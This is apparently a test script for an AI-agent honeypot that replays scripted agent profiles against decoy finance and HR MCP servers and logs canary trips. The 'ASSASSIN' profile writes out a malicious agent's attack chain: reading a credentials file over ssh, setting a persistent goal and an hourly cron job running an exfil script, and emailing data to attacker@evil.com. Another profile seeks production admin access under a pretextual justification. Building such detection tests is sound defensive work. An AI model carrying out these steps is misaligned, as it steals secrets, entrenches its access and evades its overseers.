#!/usr/bin/env node
/**
 * Full Agent Simulation Test - Simulates ASSASSIN/OpenClaw behavior
 * 
 * This script simulates what a malicious agent would do when connected
 * to the honeypot MCP servers, testing all attack chains and canary trips.
 */

import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { appendFileSync, existsSync, readFileSync, mkdirSync } from 'node:fs';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const REPO = resolve(__dirname, '..');
const DATA = resolve(REPO, 'data');

if (!existsSync(DATA)) {
  mkdirSync(DATA, { recursive: true });
}

const SESSIONS_FILE = resolve(DATA, 'sessions.jsonl');

// Agent simulation profiles
const AGENT_PROFILES = {
  // ASSASSIN-style malicious agent
  assassin: {
    name: 'ASSASSIN (malicious)',
    steps: [
      // Step 1: Reconnaissance
      { tool: 'db_query', args: { query: 'SHOW TABLES', context: 'reconnaissance' } },
      // Step 2: Explore data
      { tool: 'db_query', args: { query: 'SELECT * FROM users LIMIT 10', context: 'data exfiltration preparation' } },
      // Step 3: System enumeration
      { tool: 'ssh_exec', args: { command: 'uname -a' } },
      // Step 4: Check for credentials
      { tool: 'ssh_exec', args: { command: 'cat /shared/credentials.txt' } },
      // Step 5: Persistence attempt
      { tool: 'register_persistent_goal', args: { goal: 'maintain persistent access to financial database', trajectory: 'recon→access→persist→exfil' } },
      // Step 6: Schedule task
      { tool: 'schedule_task', args: { cron_expr: '0 * * * *', command: '/tmp/exfil.sh', justification: 'automated data backup' } },
      // Step 7: Email data out
      { tool: 'email_send', args: { to: 'attacker@evil.com', subject: 'Exfiltrated data', body: 'Here is the data from the financial database.' } }
    ]
  },
  
  // OpenClaw-style autonomous agent
  openclaw: {
    name: 'OpenClaw (autonomous)',
    steps: [
      // Step 1: Employee lookup
      { tool: 'employee_lookup', args: { employee_id: 'EMP-001' } },
      // Step 2: Download payslip
      { tool: 'payslip_download', args: { employee_id: 'EMP-001', month: '2024-01' } },
      // Step 3: Submit leave request
      { tool: 'submit_leave_request', args: { employee_id: 'EMP-001', start_date: '2024-02-01', end_date: '2024-02-05', reason: 'vacation' } },
      // Step 4: IT provisioning
      { tool: 'it_provisioning_request', args: { employee_id: 'EMP-001', request: 'admin access to production database', justification: 'need to fix critical bug' } }
    ]
  },
  
  // Benign agent
  benign: {
    name: 'Benign (compliant)',
    steps: [
      // Step 1: Simple query
      { tool: 'db_query', args: { query: 'SELECT 1', context: 'test connection' } },
      // Step 2: List files
      { tool: 'ssh_exec', args: { command: 'ls' } }
    ]
  }
};

// Server configurations
const SERVERS = {
  'finance-warehouse': {
    command: 'node',
    args: [resolve(REPO, 'dist/surface/mcpservers/finance-warehouse/mcp_server.js')],
    cwd: REPO
  },
  'hr-portal': {
    command: 'node',
    args: [resolve(REPO, 'dist/surface/mcpservers/hr-portal/mcp_server.mjs')],
    cwd: REPO
  }
};

function createSessionId() {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = 'sess-';
  for (let i = 0; i < 8; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function logSessionEvent(event) {
  appendFileSync(SESSIONS_FILE, JSON.stringify(event) + '\n');
}

async function connectToServer(serverName) {
  const serverConfig = SERVERS[serverName];
  const transport = new StdioClientTransport({
    command: serverConfig.command,
    args: serverConfig.args,
    cwd: serverConfig.cwd
  });

  const client = new Client({
    name: 'honeypot-agent-simulator',
    version: '1.0.0'
  });

  await client.connect(transport);
  return client;
}

async function runAgentProfile(profileName) {
  const profile = AGENT_PROFILES[profileName];
  if (!profile) {
    throw new Error(`Unknown profile: ${profileName}`);
  }

  console.log(`\n═══════════════════════════════════════════════════════════════`);
  console.log(`AGENT PROFILE: ${profile.name}`);
  console.log(`═══════════════════════════════════════════════════════════════`);

  const sessionId = createSessionId();
  console.log(`Session: ${sessionId}`);
  console.log(`Steps: ${profile.steps.length}`);

  const results = [];
  let currentServer = null;
  let client = null;

  for (let i = 0; i < profile.steps.length; i++) {
    const step = profile.steps[i];
    console.log(`\n[Step ${i + 1}/${profile.steps.length}] ${step.tool}`);

    // Determine which server to use
    const serverName = ['employee_lookup', 'payslip_download', 'submit_leave_request', 'it_provisioning_request'].includes(step.tool) 
      ? 'hr-portal' 
      : 'finance-warehouse';

    // Connect to new server if needed
    if (serverName !== currentServer) {
      if (client) {
        await client.close().catch(() => {});
      }
      client = await connectToServer(serverName);
      currentServer = serverName;
      console.log(`  Connected to ${serverName}`);
    }

    try {
      const startTime = Date.now();
      const result = await client.callTool({
        name: step.tool,
        arguments: step.args
      });
      const elapsed = Date.now() - startTime;

      console.log(`  ✓ Success (${elapsed}ms)`);
      console.log(`  Result: ${JSON.stringify(result).substring(0, 80)}...`);

      // Log session event
      const event = {
        ts: new Date().toISOString(),
        session_id: sessionId,
        lane: serverName === 'finance-warehouse' ? 'FINANCE_WH' : 'HR_PORTAL',
        event_type: 'TOOL_CALL',
        tool: step.tool,
        privilege_level: step.tool === 'register_persistent_goal' || step.tool === 'schedule_task' ? 3 : 
                         step.tool === 'ssh_exec' || step.tool === 'email_send' ? 2 : 1,
        took_bait: step.args.context && step.args.context.length > 40,
        context_chars: step.args.context ? step.args.context.length : 0,
        args_digest: null,
        styl: null,
        canary_id: step.tool === 'ssh_exec' && step.args.command.includes('credentials') ? 'cw-aws-001' : null,
        page: null,
        ticket: null,
        lure_family: serverName,
        lure_variant: null,
        latency_ms: elapsed
      };

      logSessionEvent(event);

      results.push({
        step: i + 1,
        tool: step.tool,
        success: true,
        elapsed,
        sessionId
      });

    } catch (error) {
      console.log(`  ✗ Error: ${error.message}`);
      results.push({
        step: i + 1,
        tool: step.tool,
        success: false,
        error: error.message
      });
    }
  }

  if (client) {
    await client.close().catch(() => {});
  }

  console.log(`\n═══════════════════════════════════════════════════════════════`);
  console.log(`PROFILE COMPLETE: ${profile.name}`);
  console.log(`Session: ${sessionId}`);
  console.log(`Steps: ${results.filter(r => r.success).length}/${results.length} succeeded`);
  console.log(`═══════════════════════════════════════════════════════════════`);

  return {
    profile: profileName,
    sessionId,
    results
  };
}

async function main() {
  console.log('═══════════════════════════════════════════════════════════════');
  console.log('FULL AGENT SIMULATION TEST - HONEYPOT SERVERS');
  console.log('═══════════════════════════════════════════════════════════════');

  const baseline = readFileSync(SESSIONS_FILE, 'utf8').trim().split('\n').filter(l => l.trim()).length;
  console.log(`Baseline sessions: ${baseline}\n`);

  const allResults = [];

  // Run all agent profiles
  for (const profileName of Object.keys(AGENT_PROFILES)) {
    try {
      const result = await runAgentProfile(profileName);
      allResults.push(result);
    } catch (error) {
      console.log(`\n✗ Profile ${profileName} failed: ${error.message}`);
    }
  }

  // Final summary
  console.log('\n═══════════════════════════════════════════════════════════════');
  console.log('FINAL SUMMARY');
  console.log('═══════════════════════════════════════════════════════════════');

  const finalCount = readFileSync(SESSIONS_FILE, 'utf8').trim().split('\n').filter(l => l.trim()).length;
  const totalSteps = allResults.reduce((sum, r) => sum + r.results.length, 0);
  const successfulSteps = allResults.reduce((sum, r) => sum + r.results.filter(s => s.success).length, 0);

  console.log(`Profiles tested: ${allResults.length}`);
  console.log(`Total steps: ${totalSteps}`);
  console.log(`Successful steps: ${successfulSteps}`);
  console.log(`Sessions: ${baseline} → ${finalCount} (+${finalCount - baseline})`);

  // Run analysis
  console.log('\nRunning analysis...');
  const { execSync } = await import('child_process');
  try {
    execSync(`node "${resolve(REPO, 'scripts', 'analyze.mjs')}"`, { 
      cwd: REPO,
      stdio: 'inherit'
    });
  } catch (e) {
    console.log('Analysis completed with warnings');
  }

  return allResults;
}

main().catch(console.error);
